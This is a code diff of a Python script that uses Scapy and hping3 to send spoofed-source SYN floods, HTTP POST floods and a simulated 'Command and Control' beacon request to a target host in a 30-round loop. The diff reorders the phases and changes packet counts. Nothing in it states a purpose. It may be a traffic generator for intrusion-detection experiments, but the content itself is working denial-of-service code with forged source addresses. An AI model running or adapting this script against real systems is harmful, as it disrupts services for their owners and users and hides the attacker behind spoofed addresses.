@@ -18,28 +18,30 @@ mac = "ce:a9:65:80:50:6e"
 # -S: Flag utilizada no ataque (SYN).
 
 getStr = 'GET /beacon.php HTTP/1.1\r\n'
-http_request_packet = Ether(dst=mac) / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / getStr
+http_request_packet = Ether() / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / getStr
 
 sendStr = 'POST /frasao HTTP/1.1\r\n'
-http_post_packet = Ether(dst=mac) / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port, flags="S") / sendStr
+http_post_packet = Ether() / IP(src=font_ip, dst=target_ip) / TCP(dport=target_port) / sendStr
 
 for j in range(30):
+    
     print("-"*100)
-    print("-"*45, "SYN Flood", "-"*45)
+    print("-"*39, "Command and Control", "-"*40)
+    print("-"*100)
+    sendp(http_request_packet)
+    sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
+    time.sleep(10)
+    
+    print("-"*100)
+    print("-"*44, "SYN Flood", "-"*45)
     print("-"*100)
     subprocess.call(f'hping3 -c {c} -p {target_port} -i {i} -S -a {font_ip} {target_ip}', shell=True)
     sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
     time.sleep(10)
-
+    
     print("-"*100)
-    print("-"*40, "Command and Control", "-"*40)
+    print("-"*44, "HTTP Flood", "-"*44)
     print("-"*100)
-    sendp(http_request_packet)
-    time.sleep(10)
-
-    print("-"*100)
-    print("-"*45, "HTTP Flood", "-"*45)
-    print("-"*100)
-    for i in range(c):
-        sendp(http_post_packet)
+    sendp(http_post_packet, count=100)
+    sys.stdout.write(f'Tempo: {(time.perf_counter()-now):.2f}s\n')
     time.sleep(10)
